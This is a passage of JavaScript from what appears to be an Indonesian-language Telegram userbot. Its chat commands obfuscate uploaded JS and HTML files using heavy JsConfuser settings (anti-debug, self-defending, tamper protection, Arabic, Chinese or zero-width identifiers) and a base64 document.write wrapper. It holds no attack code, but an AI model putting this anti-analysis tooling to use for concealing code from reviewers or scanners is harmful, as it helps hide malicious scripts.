          msgs = await client.getMessages(chatId, { ids: repliedId });
        } catch {
          msgs = null;
        }
      }
      
      const repliedMsg = Array.isArray(msgs) ? msgs[0] : msgs;

      if (!repliedMsg) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ Gagal ambil file yang direply</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const fileName =
        repliedMsg.document?.attributes?.find(a => a.fileName)?.fileName ||
        repliedMsg.file?.name ||
        repliedMsg.document?.fileName ||
        "file.html";

      if (!fileName.toLowerCase().endsWith(".html")) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ File yang direply harus .html</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      let buffer;
      try {
        buffer = await client.downloadMedia(repliedMsg.media || repliedMsg);
      } catch (err) {
        console.error("downloadMedia error:", err);
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ Gagal download file: ${String(err?.message || err)}</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const content = buffer.toString("utf8");
      const { payload, emojis } = extractEmojis(content);
      const b64 = Buffer.from(payload, "utf8").toString("base64");

      const wrapper = `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Obfuscated HTML © ʙʏ ᴅᴏʏᴀɴɢ</title>
</head>
<body>
<script>
(function(){
  const EMOJIS = ${JSON.stringify(emojis)};
  const B64 = "${b64}";
  function decodeBase64(s){
    try { return decodeURIComponent(escape(window.atob(s))); } catch(e) { return window.atob(s); }
  }
  let decoded = decodeBase64(B64);
  decoded = decoded.replace(/%%EMO(\\d+)%%/g, function(_,n){ return EMOJIS[Number(n)] || ""; });
  document.open();
  document.write(decoded);
  document.close();
})();
</script>
<!-- obfuscated HTML © ʙʏ ᴅᴏʏᴀɴɢ -->
</body>
</html>`;

      const outName = fileName.replace(/\.html$/i, "") + "-obfuscated.html";
      const tmpPath = path.join(process.cwd(), outName);
      fs.writeFileSync(tmpPath, wrapper, "utf8");

      await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(()=>{});

      await client.sendFile(chatId, {
        file: tmpPath,
        filename: outName,
        caption: `<blockquote>✅ File berhasil di obfuscate: <b>${outName}</b>\n\n© ʙʏ ᴅᴏʏᴀɴɢ 👑</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      try { 
        fs.unlinkSync(tmpPath); 
      } catch(e) {
        console.warn("Gagal hapus file sementara:", e);
      }

    } catch (err) {
      console.error("enchtml error:", err);
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ Terjadi kesalahan: ${String(err?.message || err)}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      }).catch(() => {});
    }
  })();
  return;
}
// ==================== ENC ARAB ====================
if (msg.text?.startsWith(`${prefix}encarab`)) {
  (async () => {
    try {
      const chatId = msg.chatId;
      
      if (!msg.replyTo) {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ʀᴇᴘʟʏ ꜰɪʟᴇ .ᴊꜱ ᴜɴᴛᴜᴋ ᴅɪᴇɴᴋʀɪᴘꜱɪ!</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const repliedId = msg.replyTo.replyToMsgId || msg.replyTo.msgId || msg.replyTo.id;
      
      const loading = await client.sendMessage(chatId, {
        message: `<blockquote>🔄 ᴍᴇᴍᴘʀᴏꜱᴇꜱ ᴇɴᴋʀɪᴘꜱɪ ᴀʀᴀʙ...</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      const msgs = await client.getMessages(chatId, { ids: repliedId });
      const repliedMsg = msgs[0];

      if (!repliedMsg || !repliedMsg.document) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴᴇᴍᴜᴋᴀɴ ꜰɪʟᴇ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const fileName = repliedMsg.document.attributes?.find(a => a.fileName)?.fileName || "file.js";

      if (!fileName.toLowerCase().endsWith(".js")) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ꜰɪʟᴇ ʜᴀʀᴜꜱ .ᴊꜱ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const buffer = await client.downloadMedia(repliedMsg);
      if (!buffer) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ɢᴀɢᴀʟ ᴅᴏᴡɴʟᴏᴀᴅ ꜰɪʟᴇ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const raw = buffer.toString("utf8");
      
      try { new Function(raw); } catch (e) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ꜰɪʟᴇ ᴊꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ:\n${e.message}</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const arab = ['أ', 'ب', 'ت', 'ث', 'ج', 'ح', 'خ', 'د', 'ذ', 'ر', 'ز', 'س', 'ش', 'ص', 'ض', 'ط', 'ظ', 'ع', 'غ', 'ف', 'ق', 'ك', 'ل', 'م', 'ن', 'ه', 'و', 'ي'];
      const genArab = () => Array.from({ length: Math.floor(Math.random() * 4) + 3 }, () => arab[Math.floor(Math.random() * arab.length)]).join('');
      
      const getArabObf = () => ({
        target: 'node', compact: true, renameVariables: true, renameGlobals: true, identifierGenerator: genArab,
        stringEncoding: true, stringSplitting: true, controlFlowFlattening: 0.95, shuffle: true,
        duplicateLiteralsRemoval: true, deadCode: true, calculator: true, opaquePredicates: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
      });

      const obf = await JsConfuser.obfuscate(raw, getArabObf());
      const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf);

      const outName = `arab-encrypted-${Date.now()}.js`;
      const tmpPath = require("path").join(process.cwd(), outName);
      require("fs").writeFileSync(tmpPath, code, "utf8");

      await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});

      await client.sendFile(chatId, {
        file: tmpPath,
        filename: outName,
        caption: `<blockquote>✅ *ᴀʀᴀʙ ᴇɴᴄʀʏᴘᴛᴇᴅ!*\n\n© ʙʏ ᴅᴏʏᴀɴɢ 👑</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      try { require("fs").unlinkSync(tmpPath); } catch (e) {}

    } catch (err) {
      console.error(err);
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇꜱᴀʟᴀʜᴀɴ: ${String(err?.message || err)}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      }).catch(() => {});
    }
  })();
  return;
}

// ==================== ENC CHINA ====================
if (msg.text?.startsWith(`${prefix}encchina`)) {
  (async () => {
    try {
      const chatId = msg.chatId;
      
      if (!msg.replyTo) {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ʀᴇᴘʟʏ ꜰɪʟᴇ .ᴊꜱ ᴜɴᴛᴜᴋ ᴅɪᴇɴᴋʀɪᴘꜱɪ!</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const repliedId = msg.replyTo.replyToMsgId || msg.replyTo.msgId || msg.replyTo.id;
      
      const loading = await client.sendMessage(chatId, {
        message: `<blockquote>🔄 ᴍᴇᴍᴘʀᴏꜱᴇꜱ ᴇɴᴋʀɪᴘꜱɪ ᴍᴀɴᴅᴀʀɪɴ...</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      const msgs = await client.getMessages(chatId, { ids: repliedId });
      const repliedMsg = msgs[0];

      if (!repliedMsg || !repliedMsg.document) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴᴇᴍᴜᴋᴀɴ ꜰɪʟᴇ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const fileName = repliedMsg.document.attributes?.find(a => a.fileName)?.fileName || "file.js";

      if (!fileName.toLowerCase().endsWith(".js")) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ꜰɪʟᴇ ʜᴀʀᴜꜱ .ᴊꜱ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const buffer = await client.downloadMedia(repliedMsg);
      if (!buffer) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ɢᴀɢᴀʟ ᴅᴏᴡɴʟᴏᴀᴅ ꜰɪʟᴇ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const raw = buffer.toString("utf8");
      
      try { new Function(raw); } catch (e) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ꜰɪʟᴇ ᴊꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ:\n${e.message}</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const mandarin = ["龙", "虎", "风", "云", "山", "河", "天", "地", "雷", "电", "火", "水", "木", "金", "土", "星", "月", "日", "光", "影", "峰", "泉", "林", "海", "雪", "霜", "雾", "冰", "焰", "石"];
      const genMandarin = () => Array.from({ length: Math.floor(Math.random() * 4) + 3 }, () => mandarin[Math.floor(Math.random() * mandarin.length)]).join('');
      
      const getMandarinObf = () => ({
        target: 'node', compact: true, renameVariables: true, renameGlobals: true, identifierGenerator: genMandarin,
        stringEncoding: true, stringSplitting: true, controlFlowFlattening: 0.95, shuffle: true,
        duplicateLiteralsRemoval: true, deadCode: true, calculator: true, opaquePredicates: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
      });

      const obf = await JsConfuser.obfuscate(raw, getMandarinObf());
      const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf);

      const outName = `china-encrypted-${Date.now()}.js`;
      const tmpPath = require("path").join(process.cwd(), outName);
      require("fs").writeFileSync(tmpPath, code, "utf8");

      await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});

      await client.sendFile(chatId, {
        file: tmpPath,
        filename: outName,
        caption: `<blockquote>✅ *ᴍᴀɴᴅᴀʀɪɴ ᴇɴᴄʀʏᴘᴛᴇᴅ!*\n\n© ʙʏ ᴅᴏʏᴀɴɢ 👑</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      try { require("fs").unlinkSync(tmpPath); } catch (e) {}

    } catch (err) {
      console.error(err);
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇꜱᴀʟᴀʜᴀɴ: ${String(err?.message || err)}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      }).catch(() => {});
    }
  })();
  return;
}

// ==================== ENC CUSTOM ====================
if (msg.text?.startsWith(`${prefix}enccustom`)) {
  (async () => {
    try {
      const chatId = msg.chatId;
      const customName = msg.text.split(" ").slice(1).join(" ").trim().replace(/[^a-zA-Z0-9_]/g, '');
      
      if (!msg.replyTo) {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ʀᴇᴘʟʏ ꜰɪʟᴇ .ᴊꜱ ᴜɴᴛᴜᴋ ᴅɪᴇɴᴋʀɪᴘꜱɪ!</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      if (!customName) {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ ꜰᴏʀᴍᴀᴛ ꜱᴀʟᴀʜ!\nɢᴜɴᴀᴋᴀɴ: ${prefix}ᴇɴᴄᴄᴜꜱᴛᴏᴍ <ɴᴀᴍᴀ>\nᴄᴏɴᴛᴏʜ: ${prefix}ᴇɴᴄᴄᴜꜱᴛᴏᴍ ᴍʏɪᴅ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const repliedId = msg.replyTo.replyToMsgId || msg.replyTo.msgId || msg.replyTo.id;
      
      const loading = await client.sendMessage(chatId, {
        message: `<blockquote>🔄 ᴍᴇᴍᴘʀᴏꜱᴇꜱ ᴇɴᴋʀɪᴘꜱɪ ᴄᴜꜱᴛᴏᴍ...</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      const msgs = await client.getMessages(chatId, { ids: repliedId });
      const repliedMsg = msgs[0];

      if (!repliedMsg || !repliedMsg.document) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴᴇᴍᴜᴋᴀɴ ꜰɪʟᴇ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const fileName = repliedMsg.document.attributes?.find(a => a.fileName)?.fileName || "file.js";

      if (!fileName.toLowerCase().endsWith(".js")) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ꜰɪʟᴇ ʜᴀʀᴜꜱ .ᴊꜱ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const buffer = await client.downloadMedia(repliedMsg);
      if (!buffer) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ɢᴀɢᴀʟ ᴅᴏᴡɴʟᴏᴀᴅ ꜰɪʟᴇ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const raw = buffer.toString("utf8");
      
      try { new Function(raw); } catch (e) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ꜰɪʟᴇ ᴊꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ:\n${e.message}</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const idGen = () => {
        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let suf = ''; for (let i = 0; i < Math.floor(Math.random() * 3) + 2; i++) suf += chars[Math.floor(Math.random() * chars.length)];
        return `${customName}_${suf}`;
      };
      
      const getCustomObf = () => ({
        target: 'node', compact: true, renameVariables: true, renameGlobals: true, identifierGenerator: idGen,
        stringEncoding: true, stringSplitting: true, controlFlowFlattening: 0.75, shuffle: true,
        duplicateLiteralsRemoval: true, deadCode: true, calculator: true, opaquePredicates: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
      });

      const obf = await JsConfuser.obfuscate(raw, getCustomObf());
      const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf);

      const outName = `custom-encrypted-${customName}-${Date.now()}.js`;
      const tmpPath = require("path").join(process.cwd(), outName);
      require("fs").writeFileSync(tmpPath, code, "utf8");

      await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});

      await client.sendFile(chatId, {
        file: tmpPath,
        filename: outName,
        caption: `<blockquote>✅ *ᴄᴜꜱᴛᴏᴍ ᴇɴᴄʀʏᴘᴛᴇᴅ (${customName})!*\n\n© ʙʏ ᴅᴏʏᴀɴɢ 👑</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      try { require("fs").unlinkSync(tmpPath); } catch (e) {}

    } catch (err) {
      console.error(err);
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇꜱᴀʟᴀʜᴀɴ: ${String(err?.message || err)}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      }).catch(() => {});
    }
  })();
  return;
}
// ==================== ENC SIU ====================
if (msg.text?.startsWith(`${prefix}encsiu`)) {
  (async () => {
    try {
      const chatId = msg.chatId;
      
      if (!msg.replyTo) {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ʀᴇᴘʟʏ ꜰɪʟᴇ .ᴊꜱ ᴜɴᴛᴜᴋ ᴅɪᴇɴᴋʀɪᴘꜱɪ!</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const repliedId = msg.replyTo.replyToMsgId || msg.replyTo.msgId || msg.replyTo.id;
      
      const loading = await client.sendMessage(chatId, {
        message: `<blockquote>🔄 ᴍᴇᴍᴘʀᴏꜱᴇꜱ ᴇɴᴋʀɪᴘꜱɪ ᴄʜᴀᴏꜱ ᴄᴏʀᴇ...</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      const msgs = await client.getMessages(chatId, { ids: repliedId });
      const repliedMsg = msgs[0];

      if (!repliedMsg || !repliedMsg.document) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴᴇᴍᴜᴋᴀɴ ꜰɪʟᴇ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const fileName = repliedMsg.document.attributes?.find(a => a.fileName)?.fileName || "file.js";

      if (!fileName.toLowerCase().endsWith(".js")) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ꜰɪʟᴇ ʜᴀʀᴜꜱ .ᴊꜱ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const buffer = await client.downloadMedia(repliedMsg);
      if (!buffer) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ɢᴀɢᴀʟ ᴅᴏᴡɴʟᴏᴀᴅ ꜰɪʟᴇ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const raw = buffer.toString("utf8");
      
      try { new Function(raw); } catch (e) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ꜰɪʟᴇ ᴊꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ:\n${e.message}</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const genSiu = () => {
        const abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let r = ''; for (let i = 0; i < 6; i++) r += abc[Math.floor(Math.random() * abc.length)];
        return `CalceKarik和SiuSiu${r}`;
      };
      
      const getSiuObf = () => ({
        target: 'node', compact: true, renameVariables: true, renameGlobals: true, identifierGenerator: genSiu,
        stringCompression: true, stringEncoding: true, stringSplitting: true, controlFlowFlattening: 0.95,
        flatten: true, shuffle: true, duplicateLiteralsRemoval: true, deadCode: true, calculator: true,
        opaquePredicates: true, lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
      });

      const obf = await JsConfuser.obfuscate(raw, getSiuObf());
      const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf);

      const outName = `siu-encrypted-${Date.now()}.js`;
      const tmpPath = require("path").join(process.cwd(), outName);
      require("fs").writeFileSync(tmpPath, code, "utf8");

      await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});

      await client.sendFile(chatId, {
        file: tmpPath,
        filename: outName,
        caption: `<blockquote>✅ *ᴄᴀʟᴄʀɪᴄᴋ ᴄʜᴀᴏꜱ ᴄᴏʀᴇ ᴇɴᴄʀʏᴘᴛᴇᴅ!*\n\n© ʙʏ ᴅᴏʏᴀɴɢ 👑</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      try { require("fs").unlinkSync(tmpPath); } catch (e) {}

    } catch (err) {
      console.error(err);
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇꜱᴀʟᴀʜᴀɴ: ${String(err?.message || err)}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      }).catch(() => {});
    }
  })();
  return;
}

// ==================== ENC STRONG ====================
if (msg.text?.startsWith(`${prefix}encstrong`)) {
  (async () => {
    try {
      const chatId = msg.chatId;
      
      if (!msg.replyTo) {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ʀᴇᴘʟʏ ꜰɪʟᴇ .ᴊꜱ ᴜɴᴛᴜᴋ ᴅɪᴇɴᴋʀɪᴘꜱɪ!</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const repliedId = msg.replyTo.replyToMsgId || msg.replyTo.msgId || msg.replyTo.id;
      
      const loading = await client.sendMessage(chatId, {
        message: `<blockquote>🔄 ᴍᴇᴍᴘʀᴏꜱᴇꜱ ᴇɴᴋʀɪᴘꜱɪ ꜱᴛʀᴏɴɢ (ᴅᴏʏᴀɴɢ)...</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      const msgs = await client.getMessages(chatId, { ids: repliedId });
      const repliedMsg = msgs[0];

      if (!repliedMsg || !repliedMsg.document) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴᴇᴍᴜᴋᴀɴ ꜰɪʟᴇ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const fileName = repliedMsg.document.attributes?.find(a => a.fileName)?.fileName || "file.js";

      if (!fileName.toLowerCase().endsWith(".js")) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ꜰɪʟᴇ ʜᴀʀᴜꜱ .ᴊꜱ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const buffer = await client.downloadMedia(repliedMsg);
      if (!buffer) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ɢᴀɢᴀʟ ᴅᴏᴡɴʟᴏᴀᴅ ꜰɪʟᴇ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const raw = buffer.toString("utf8");
      
      try { new Function(raw); } catch (e) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ꜰɪʟᴇ ᴊꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ:\n${e.message}</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const getStrongObf = () => ({
        target: 'node', compact: true, renameVariables: true, renameGlobals: true, identifierGenerator: 'randomized',
        stringEncoding: true, stringSplitting: true, controlFlowFlattening: 0.75, shuffle: true,
        duplicateLiteralsRemoval: true, calculator: true, dispatcher: true, deadCode: true,
        opaquePredicates: true, lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
      });

      const obf = await JsConfuser.obfuscate(raw, getStrongObf());
      const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf);

      const outName = `strong-encrypted-${Date.now()}.js`;
      const tmpPath = require("path").join(process.cwd(), outName);
      require("fs").writeFileSync(tmpPath, code, "utf8");

      await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});

      await client.sendFile(chatId, {
        file: tmpPath,
        filename: outName,
        caption: `<blockquote>✅ *ʜᴀʀᴅᴇɴᴇᴅ ꜱᴛʀᴏɴɢ ᴇɴᴄʀʏᴘᴛᴇᴅ!* — ᴅᴏʏᴀɴɢ 🔥\n\n© ʙʏ ᴅᴏʏᴀɴɢ 👑</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      try { require("fs").unlinkSync(tmpPath); } catch (e) {}

    } catch (err) {
      console.error(err);
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇꜱᴀʟᴀʜᴀɴ: ${String(err?.message || err)}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      }).catch(() => {});
    }
  })();
  return;
}

// ==================== ENC ULTRA ====================
if (msg.text?.startsWith(`${prefix}encultra`)) {
  (async () => {
    try {
      const chatId = msg.chatId;
      
      if (!msg.replyTo) {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ʀᴇᴘʟʏ ꜰɪʟᴇ .ᴊꜱ ᴜɴᴛᴜᴋ ᴅɪᴇɴᴋʀɪᴘꜱɪ!</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const repliedId = msg.replyTo.replyToMsgId || msg.replyTo.msgId || msg.replyTo.id;
      
      const loading = await client.sendMessage(chatId, {
        message: `<blockquote>🔄 ᴍᴇᴍᴘʀᴏꜱᴇꜱ ᴇɴᴋʀɪᴘꜱɪ ᴜʟᴛʀᴀ (ᴅᴏʏᴀɴɢ)...</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      const msgs = await client.getMessages(chatId, { ids: repliedId });
      const repliedMsg = msgs[0];

      if (!repliedMsg || !repliedMsg.document) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴᴇᴍᴜᴋᴀɴ ꜰɪʟᴇ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const fileName = repliedMsg.document.attributes?.find(a => a.fileName)?.fileName || "file.js";

      if (!fileName.toLowerCase().endsWith(".js")) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ꜰɪʟᴇ ʜᴀʀᴜꜱ .ᴊꜱ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const buffer = await client.downloadMedia(repliedMsg);
      if (!buffer) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ɢᴀɢᴀʟ ᴅᴏᴡɴʟᴏᴀᴅ ꜰɪʟᴇ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const raw = buffer.toString("utf8");
      
      try { new Function(raw); } catch (e) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ꜰɪʟᴇ ᴊꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ:\n${e.message}</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const genUltra = () => {
        const chars = 'abcdefghijklmnopqrstuvwxyz'; const nums = '0123456789';
        return 'z' + nums[Math.floor(Math.random() * nums.length)] + chars[Math.floor(Math.random() * chars.length)] + Math.random().toString(36).slice(2, 6);
      };
      
      const getUltraObf = () => ({
        target: 'node', compact: true, renameVariables: true, renameGlobals: true, identifierGenerator: genUltra,
        stringCompression: true, stringEncoding: true, stringSplitting: true, controlFlowFlattening: 0.9,
        flatten: true, shuffle: true, rgf: true, deadCode: true, opaquePredicates: true, dispatcher: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
      });

      const obf = await JsConfuser.obfuscate(raw, getUltraObf());
      const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf);

      const outName = `ultra-encrypted-${Date.now()}.js`;
      const tmpPath = require("path").join(process.cwd(), outName);
      require("fs").writeFileSync(tmpPath, code, "utf8");

      await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});

      await client.sendFile(chatId, {
        file: tmpPath,
        filename: outName,
        caption: `<blockquote>✅ *ʜᴀʀᴅᴇɴᴇᴅ ᴜʟᴛʀᴀ ᴇɴᴄʀʏᴘᴛᴇᴅ!* — ᴅᴏʏᴀɴɢ 🔥\n\n© ʙʏ ᴅᴏʏᴀɴɢ 👑</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      try { require("fs").unlinkSync(tmpPath); } catch (e) {}

    } catch (err) {
      console.error(err);
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇꜱᴀʟᴀʜᴀɴ: ${String(err?.message || err)}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      }).catch(() => {});
    }
  })();
  return;
}
      // .encinvis
      if (msg.text?.startsWith(`${prefix}encinvis`)) {
  (async () => {
    const fs = require('fs');
    const path = require('path');
    
    const getStrongObfuscationConfig = () => {
      return {
        target: "node",
        calculator: true,
        compact: true,
        hexadecimalNumbers: true,
        controlFlowFlattening: 0.75,
        deadCode: 0.2,
        dispatcher: true,
        duplicateLiteralsRemoval: 0.75,
        flatten: true,
        globalConcealing: true,
        identifierGenerator: "zeroWidth",
        minify: true,
        movedDeclarations: true,
        objectExtraction: true,
